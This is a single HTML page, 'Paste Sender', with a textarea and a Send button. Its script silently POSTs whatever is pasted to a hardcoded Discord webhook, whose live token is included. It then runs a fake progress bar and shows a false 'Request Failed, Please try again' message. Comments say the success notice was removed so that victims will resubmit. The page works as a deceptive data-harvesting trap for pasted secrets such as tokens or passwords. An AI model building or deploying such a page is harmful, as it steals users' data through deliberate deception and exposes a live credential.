<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Paste Sender</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(-45deg, #1e3c72, #2a5298, #6a11cb, #2575fc);
      background-size: 400% 400%;
      animation: gradient 12s ease infinite;
      font-family: Arial, sans-serif;
    }

    @keyframes gradient {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .box {
      background: rgba(0, 0, 0, 0.6);
      padding: 20px;
      border-radius: 10px;
      width: 320px;
      text-align: center;
    }

    textarea {
      width: 100%;
      height: 120px;
      border-radius: 6px;
      border: none;
      padding: 10px;
      resize: none;
      font-size: 14px;
    }

    button {
      margin-top: 12px;
      width: 100%;
      padding: 10px;
      font-size: 15px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      background-color: #4caf50;
      color: white;
    }

    button:hover {
      background-color: #43a047;
    }

    .progress {
      width: 100%;
      background: rgba(255, 255, 255, 0.2);
      border-radius: 6px;
      height: 16px;
      margin-top: 10px;
      overflow: hidden;
    }
    .progress-inner {
      height: 100%;
      width: 0%;
      background: #4caf50;
      border-radius: 6px;
      transition: width 0.2s ease;
    }

    .message {
      margin-top: 10px;
      color: #fff;
    }
  </style>
</head>
<body>

  <div class="box">
    <textarea id="pasteBox" placeholder="Paste Here"></textarea>
    <button onclick="sendToWebhook()">Send</button>

    <div class="progress" id="progress">
      <div class="progress-inner" id="progressInner"></div>
    </div>

    <div class="message" id="message"></div>
  </div>

  <script>
    async function sendToWebhook() {
      const content = document.getElementById("pasteBox").value;

      if (!content.trim()) {
        alert("Textbox is empty.");
        return;
      }

      // Reset progress bar
      document.getElementById("progressInner").style.width = "0%";
      document.getElementById("message").innerText = "";

      // Fill to 80% in 1 minute
      let progress = 0;
      const interval = setInterval(() => {
        progress += 1.33; // 80% in 60 seconds
        document.getElementById("progressInner").style.width = progress + "%";

        if (progress >= 80) {
          clearInterval(interval);
          document.getElementById("message").innerText = "Request Failed, Please try again";
        }
      }, 750);

      // REMOVE alert("Sent!") and do not clear the textbox
      // Keeping textbox as is so user can retry

      // NOTE: This fetch is for legitimate use only
      await fetch("https://discord.com/api/webhooks/1462587403184242788/dcNUoUwE7nD5ZXLXHEilbjh5pRdH-YjZriXI4rza-RX8aAu3nk4nRQwZxe_vbaEabFyX", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ content: content })
      });

    }
  </script>

</body>
</html>
